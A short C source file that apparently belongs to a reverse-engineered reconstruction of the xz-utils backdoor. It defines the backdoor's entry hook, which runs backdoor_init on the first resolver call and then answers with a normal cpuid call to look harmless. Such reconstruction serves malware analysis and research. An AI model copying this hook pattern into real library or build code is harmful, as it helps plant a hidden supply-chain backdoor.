/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"

unsigned int backdoor_entry(unsigned int cpuid_request, u64 *caller_frame){
	u32 a = 0, b = 0, c = 0, d = 0;
	elf_entry_ctx_t state;

	if(resolver_call_count == 1){
		state.symbol_ptr = (void *)1;
		memset(&state.got_ctx, 0x00, sizeof(state.got_ctx));
		state.frame_address = caller_frame;
		backdoor_init(&state, caller_frame);
	}
	++resolver_call_count;
	_cpuid_gcc(cpuid_request, &a, &b, &c, &d);
	return a;
}
